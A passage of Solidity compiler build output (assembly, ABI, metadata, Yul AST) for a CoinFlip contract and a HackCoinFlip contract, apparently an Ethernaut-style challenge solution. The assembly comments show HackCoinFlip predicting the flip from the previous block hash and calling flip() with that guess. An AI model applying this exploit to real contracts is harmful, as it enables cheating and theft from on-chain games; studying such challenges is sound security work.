											"begin": 2121,
											"end": 2209,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2228,
											"end": 2232,
											"name": "PUSH",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 2225,
											"end": 2226,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2218,
											"end": 2233,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2252,
											"end": 2256,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2249,
											"end": 2250,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2242,
											"end": 2257,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2269,
											"end": 2385,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 2269,
											"end": 2385,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2354,
											"end": 2359,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "tag",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2332,
											"end": 2337,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2329,
											"end": 2361,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2375,
											"end": 2376,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2372,
											"end": 2373,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 2365,
											"end": 2377,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "tag",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2309,
											"end": 2385,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2309,
											"end": 2385,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/coinflip.sol\":\"CoinFlip\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/coinflip.sol\":{\"keccak256\":\"0x83b137afee61967a9974d44c902623ac57a190258d54c83c31ef7112ef2d3341\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6b3bafc899ce6bb08099abcd5251a57a0503d48faec36ebd535008d860b65f61\",\"dweb:/ipfs/QmP7mArHd1H8JtchbUnxc88g5bWt7yT1cPEB4ueuLTwyyy\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "contracts/coinflip.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 5,
								"contract": "contracts/coinflip.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 8,
								"contract": "contracts/coinflip.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/hackcoinflip.sol": {
				"HackCoinFlip": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_coinFlipContract",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "coinFlipContract",
							"outputs": [
								{
									"internalType": "contract CoinFlip",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "makeGuess",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/hackcoinflip.sol\":86:621  contract HackCoinFlip{\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/hackcoinflip.sol\":172:249  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/hackcoinflip.sol\":155:249  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"contracts/hackcoinflip.sol\":258:368  constructor(address _coinFlipContract) public{\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/hackcoinflip.sol\":342:359  _coinFlipContract */\n  dup1\n    /* \"contracts/hackcoinflip.sol\":314:330  coinFlipContract */\n  0x00\n  dup1\n    /* \"contracts/hackcoinflip.sol\":314:360  coinFlipContract = CoinFlip(_coinFlipContract) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/hackcoinflip.sol\":258:368  constructor(address _coinFlipContract) public{\r... */\n  pop\n    /* \"contracts/hackcoinflip.sol\":86:621  contract HackCoinFlip{\r... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":70:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:440   */\ntag_3:\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:245   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":291:292   */\n  0x00\n    /* \"#utility.yul\":288:289   */\n  dup1\n    /* \"#utility.yul\":281:293   */\n  revert\n    /* \"#utility.yul\":243:245   */\ntag_13:\n    /* \"#utility.yul\":334:335   */\n  0x00\n    /* \"#utility.yul\":359:423   */\n  tag_14\n    /* \"#utility.yul\":415:422   */\n  dup5\n    /* \"#utility.yul\":406:412   */\n  dup3\n    /* \"#utility.yul\":395:404   */\n  dup6\n    /* \"#utility.yul\":391:413   */\n  add\n    /* \"#utility.yul\":359:423   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":349:423   */\n  swap2\n  pop\n    /* \"#utility.yul\":305:433   */\n  pop\n    /* \"#utility.yul\":233:440   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":446:542   */\ntag_15:\n  0x00\n    /* \"#utility.yul\":512:536   */\n  tag_17\n    /* \"#utility.yul\":530:535   */\n  dup3\n    /* \"#utility.yul\":512:536   */\n  tag_18\n  jump\t// in\ntag_17:\n    /* \"#utility.yul\":501:536   */\n  swap1\n  pop\n    /* \"#utility.yul\":491:542   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":548:674   */\ntag_18:\n  0x00\n    /* \"#utility.yul\":625:667   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":618:623   */\n  dup3\n    /* \"#utility.yul\":614:668   */\n  and\n    /* \"#utility.yul\":603:668   */\n  swap1\n  pop\n    /* \"#utility.yul\":593:674   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":680:802   */\ntag_11:\n    /* \"#utility.yul\":753:777   */\n  tag_21\n    /* \"#utility.yul\":771:776   */\n  dup2\n    /* \"#utility.yul\":753:777   */\n  tag_15\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":746:751   */\n  dup2\n    /* \"#utility.yul\":743:778   */\n  eq\n    /* \"#utility.yul\":733:735   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":792:793   */\n  0x00\n    /* \"#utility.yul\":789:790   */\n  dup1\n    /* \"#utility.yul\":782:794   */\n  revert\n    /* \"#utility.yul\":733:735   */\ntag_22:\n    /* \"#utility.yul\":723:802   */\n  pop\n  jump\t// out\n    /* \"contracts/hackcoinflip.sol\":86:621  contract HackCoinFlip{\r... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/hackcoinflip.sol\":86:621  contract HackCoinFlip{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x53b3b3b3\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x931c9f32\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/hackcoinflip.sol\":116:148  CoinFlip public coinFlipContract */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/hackcoinflip.sol\":374:618  function makeGuess() public {\r... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/hackcoinflip.sol\":116:148  CoinFlip public coinFlipContract */\n    tag_6:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/hackcoinflip.sol\":374:618  function makeGuess() public {\r... */\n    tag_10:\n        /* \"contracts/hackcoinflip.sol\":415:433  uint256 blockValue */\n      0x00\n        /* \"contracts/hackcoinflip.sol\":467:468  1 */\n      0x01\n        /* \"contracts/hackcoinflip.sol\":454:466  block.number */\n      number\n        /* \"contracts/hackcoinflip.sol\":454:468  block.number-1 */\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n        /* \"contracts/hackcoinflip.sol\":444:469  blockhash(block.number-1) */\n      blockhash\n        /* \"contracts/hackcoinflip.sol\":436:470  uint256(blockhash(block.number-1)) */\n      0x00\n      shr\n        /* \"contracts/hackcoinflip.sol\":415:470  uint256 blockValue = uint256(blockhash(block.number-1)) */\n      swap1\n      pop\n        /* \"contracts/hackcoinflip.sol\":481:497  uint256 coinFlip */\n      0x00\n        /* \"contracts/hackcoinflip.sol\":511:517  FACTOR */\n      sload(0x01)\n        /* \"contracts/hackcoinflip.sol\":500:510  blockValue */\n      dup3\n        /* \"contracts/hackcoinflip.sol\":500:517  blockValue/FACTOR */\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n        /* \"contracts/hackcoinflip.sol\":481:517  uint256 coinFlip = blockValue/FACTOR */\n      swap1\n      pop\n        /* \"contracts/hackcoinflip.sol\":528:538  bool guess */\n      0x00\n        /* \"contracts/hackcoinflip.sol\":553:554  1 */\n      0x01\n        /* \"contracts/hackcoinflip.sol\":541:549  coinFlip */\n      dup3\n        /* \"contracts/hackcoinflip.sol\":541:554  coinFlip == 1 */\n      eq\n        /* \"contracts/hackcoinflip.sol\":541:569  coinFlip == 1 ? true : false */\n      tag_16\n      jumpi\n        /* \"contracts/hackcoinflip.sol\":564:569  false */\n      0x00\n        /* \"contracts/hackcoinflip.sol\":541:569  coinFlip == 1 ? true : false */\n      jump(tag_17)\n    tag_16:\n        /* \"contracts/hackcoinflip.sol\":557:561  true */\n      0x01\n        /* \"contracts/hackcoinflip.sol\":541:569  coinFlip == 1 ? true : false */\n    tag_17:\n        /* \"contracts/hackcoinflip.sol\":528:569  bool guess = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/hackcoinflip.sol\":582:598  coinFlipContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/hackcoinflip.sol\":582:603  coinFlipContract.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/hackcoinflip.sol\":604:609  guess */\n      dup3\n        /* \"contracts/hackcoinflip.sol\":582:610  coinFlipContract.flip(guess) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      pop\n        /* \"contracts/hackcoinflip.sol\":374:618  function makeGuess() public {\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:144   */\n    tag_26:\n      0x00\n        /* \"#utility.yul\":92:98   */\n      dup2\n        /* \"#utility.yul\":86:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":108:138   */\n      tag_28\n        /* \"#utility.yul\":132:137   */\n      dup2\n        /* \"#utility.yul\":108:138   */\n      tag_29\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":67:144   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":150:428   */\n    tag_24:\n      0x00\n        /* \"#utility.yul\":266:268   */\n      0x20\n        /* \"#utility.yul\":254:263   */\n      dup3\n        /* \"#utility.yul\":245:252   */\n      dup5\n        /* \"#utility.yul\":241:264   */\n      sub\n        /* \"#utility.yul\":237:269   */\n      slt\n        /* \"#utility.yul\":234:236   */\n      iszero\n      tag_31\n      jumpi\n        /* \"#utility.yul\":282:283   */\n      0x00\n        /* \"#utility.yul\":279:280   */\n      dup1\n        /* \"#utility.yul\":272:284   */\n      revert\n        /* \"#utility.yul\":234:236   */\n    tag_31:\n        /* \"#utility.yul\":325:326   */\n      0x00\n        /* \"#utility.yul\":350:411   */\n      tag_32\n        /* \"#utility.yul\":403:410   */\n      dup5\n        /* \"#utility.yul\":394:400   */\n      dup3\n        /* \"#utility.yul\":383:392   */\n      dup6\n        /* \"#utility.yul\":379:401   */\n      add\n        /* \"#utility.yul\":350:411   */\n      tag_26\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":340:411   */\n      swap2\n      pop\n        /* \"#utility.yul\":296:421   */\n      pop\n        /* \"#utility.yul\":224:428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":434:543   */\n    tag_33:\n        /* \"#utility.yul\":515:536   */\n      tag_35\n        /* \"#utility.yul\":530:535   */\n      dup2\n        /* \"#utility.yul\":515:536   */\n      tag_36\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":510:513   */\n      dup3\n        /* \"#utility.yul\":503:537   */\n      mstore\n        /* \"#utility.yul\":493:543   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":549:710   */\n    tag_37:\n        /* \"#utility.yul\":651:703   */\n      tag_39\n        /* \"#utility.yul\":697:702   */\n      dup2\n        /* \"#utility.yul\":651:703   */\n      tag_40\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":646:649   */\n      dup3\n        /* \"#utility.yul\":639:704   */\n      mstore\n        /* \"#utility.yul\":629:710   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":716:926   */\n    tag_19:\n      0x00\n        /* \"#utility.yul\":841:843   */\n      0x20\n        /* \"#utility.yul\":830:839   */\n      dup3\n        /* \"#utility.yul\":826:844   */\n      add\n        /* \"#utility.yul\":818:844   */\n      swap1\n      pop\n        /* \"#utility.yul\":854:919   */\n      tag_42\n        /* \"#utility.yul\":916:917   */\n      0x00\n        /* \"#utility.yul\":905:914   */\n      dup4\n        /* \"#utility.yul\":901:918   */\n      add\n        /* \"#utility.yul\":892:898   */\n      dup5\n        /* \"#utility.yul\":854:919   */\n      tag_33\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":808:926   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":932:1184   */\n    tag_8:\n      0x00\n        /* \"#utility.yul\":1078:1080   */\n      0x20\n        /* \"#utility.yul\":1067:1076   */\n      dup3\n        /* \"#utility.yul\":1063:1081   */\n      add\n        /* \"#utility.yul\":1055:1081   */\n      swap1\n      pop\n        /* \"#utility.yul\":1091:1177   */\n      tag_44\n        /* \"#utility.yul\":1174:1175   */\n      0x00\n        /* \"#utility.yul\":1163:1172   */\n      dup4\n        /* \"#utility.yul\":1159:1176   */\n      add\n        /* \"#utility.yul\":1150:1156   */\n      dup5\n        /* \"#utility.yul\":1091:1177   */\n      tag_37\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":1045:1184   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1190:1375   */\n    tag_15:\n      0x00\n        /* \"#utility.yul\":1247:1267   */\n      tag_46\n        /* \"#utility.yul\":1265:1266   */\n      dup3\n        /* \"#utility.yul\":1247:1267   */\n      tag_47\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":1242:1267   */\n      swap2\n      pop\n        /* \"#utility.yul\":1281:1301   */\n      tag_48\n        /* \"#utility.yul\":1299:1300   */\n      dup4\n        /* \"#utility.yul\":1281:1301   */\n      tag_47\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1276:1301   */\n      swap3\n      pop\n        /* \"#utility.yul\":1320:1321   */\n      dup3\n        /* \"#utility.yul\":1310:1312   */\n      tag_49\n      jumpi\n        /* \"#utility.yul\":1325:1343   */\n      tag_50\n      tag_51\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1310:1312   */\n    tag_49:\n        /* \"#utility.yul\":1367:1368   */\n      dup3\n        /* \"#utility.yul\":1364:1365   */\n      dup3\n        /* \"#utility.yul\":1360:1369   */\n      div\n        /* \"#utility.yul\":1355:1369   */\n      swap1\n      pop\n        /* \"#utility.yul\":1232:1375   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1381:1572   */\n    tag_13:\n      0x00\n        /* \"#utility.yul\":1441:1461   */\n      tag_53\n        /* \"#utility.yul\":1459:1460   */\n      dup3\n        /* \"#utility.yul\":1441:1461   */\n      tag_47\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1436:1461   */\n      swap2\n      pop\n        /* \"#utility.yul\":1475:1495   */\n      tag_54\n        /* \"#utility.yul\":1493:1494   */\n      dup4\n        /* \"#utility.yul\":1475:1495   */\n      tag_47\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1470:1495   */\n      swap3\n      pop\n        /* \"#utility.yul\":1514:1515   */\n      dup3\n        /* \"#utility.yul\":1511:1512   */\n      dup3\n        /* \"#utility.yul\":1508:1516   */\n      lt\n        /* \"#utility.yul\":1505:1507   */\n      iszero\n      tag_55\n      jumpi\n        /* \"#utility.yul\":1519:1537   */\n      tag_56\n      tag_57\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1505:1507   */\n    tag_55:\n        /* \"#utility.yul\":1564:1565   */\n      dup3\n        /* \"#utility.yul\":1561:1562   */\n      dup3\n        /* \"#utility.yul\":1557:1566   */\n      sub\n        /* \"#utility.yul\":1549:1566   */\n      swap1\n      pop\n        /* \"#utility.yul\":1426:1572   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1578:1668   */\n    tag_36:\n      0x00\n        /* \"#utility.yul\":1655:1660   */\n      dup2\n        /* \"#utility.yul\":1648:1661   */\n      iszero\n        /* \"#utility.yul\":1641:1662   */\n      iszero\n        /* \"#utility.yul\":1630:1662   */\n      swap1\n      pop\n        /* \"#utility.yul\":1620:1668   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1674:1800   */\n    tag_59:\n      0x00\n        /* \"#utility.yul\":1751:1793   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1744:1749   */\n      dup3\n        /* \"#utility.yul\":1740:1794   */\n      and\n        /* \"#utility.yul\":1729:1794   */\n      swap1\n      pop\n        /* \"#utility.yul\":1719:1800   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1806:1883   */\n    tag_47:\n      0x00\n        /* \"#utility.yul\":1872:1877   */\n      dup2\n        /* \"#utility.yul\":1861:1877   */\n      swap1\n      pop\n        /* \"#utility.yul\":1851:1883   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1889:2045   */\n    tag_40:\n      0x00\n        /* \"#utility.yul\":1987:2039   */\n      tag_63\n        /* \"#utility.yul\":2033:2038   */\n      dup3\n        /* \"#utility.yul\":1987:2039   */\n      tag_64\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":1974:2039   */\n      swap1\n      pop\n        /* \"#utility.yul\":1964:2045   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2051:2179   */\n    tag_64:\n      0x00\n        /* \"#utility.yul\":2149:2173   */\n      tag_66\n        /* \"#utility.yul\":2167:2172   */\n      dup3\n        /* \"#utility.yul\":2149:2173   */\n      tag_59\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2136:2173   */\n      swap1\n      pop\n        /* \"#utility.yul\":2126:2179   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2185:2365   */\n    tag_57:\n        /* \"#utility.yul\":2233:2310   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2230:2231   */\n      0x00\n        /* \"#utility.yul\":2223:2311   */\n      mstore\n        /* \"#utility.yul\":2330:2334   */\n      0x11\n        /* \"#utility.yul\":2327:2328   */\n      0x04\n        /* \"#utility.yul\":2320:2335   */\n      mstore\n        /* \"#utility.yul\":2354:2358   */\n      0x24\n        /* \"#utility.yul\":2351:2352   */\n      0x00\n        /* \"#utility.yul\":2344:2359   */\n      revert\n        /* \"#utility.yul\":2371:2551   */\n    tag_51:\n        /* \"#utility.yul\":2419:2496   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2416:2417   */\n      0x00\n        /* \"#utility.yul\":2409:2497   */\n      mstore\n        /* \"#utility.yul\":2516:2520   */\n      0x12\n        /* \"#utility.yul\":2513:2514   */\n      0x04\n        /* \"#utility.yul\":2506:2521   */\n      mstore\n        /* \"#utility.yul\":2540:2544   */\n      0x24\n        /* \"#utility.yul\":2537:2538   */\n      0x00\n        /* \"#utility.yul\":2530:2545   */\n      revert\n        /* \"#utility.yul\":2557:2673   */\n    tag_29:\n        /* \"#utility.yul\":2627:2648   */\n      tag_70\n        /* \"#utility.yul\":2642:2647   */\n      dup2\n        /* \"#utility.yul\":2627:2648   */\n      tag_36\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2620:2625   */\n      dup2\n        /* \"#utility.yul\":2617:2649   */\n      eq\n        /* \"#utility.yul\":2607:2609   */\n      tag_71\n      jumpi\n        /* \"#utility.yul\":2663:2664   */\n      0x00\n        /* \"#utility.yul\":2660:2661   */\n      dup1\n        /* \"#utility.yul\":2653:2665   */\n      revert\n        /* \"#utility.yul\":2607:2609   */\n    tag_71:\n        /* \"#utility.yul\":2597:2673   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220543d1d06066c46476da9229d6d949d3ccab3a77528281795b03d89c9bb2ead3d64736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:805:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "70:80:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "80:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "95:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "89:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "89:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "80:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "138:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "111:26:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "111:33:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "111:33:2"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "48:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "56:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "64:5:2",
														"type": ""
													}
												],
												"src": "7:143:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "233:207:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "279:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "288:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "291:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "281:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "281:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "281:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "254:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "263:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "250:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "250:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "275:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "246:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "246:32:2"
															},
															"nodeType": "YulIf",
															"src": "243:2:2"
														},
														{
															"nodeType": "YulBlock",
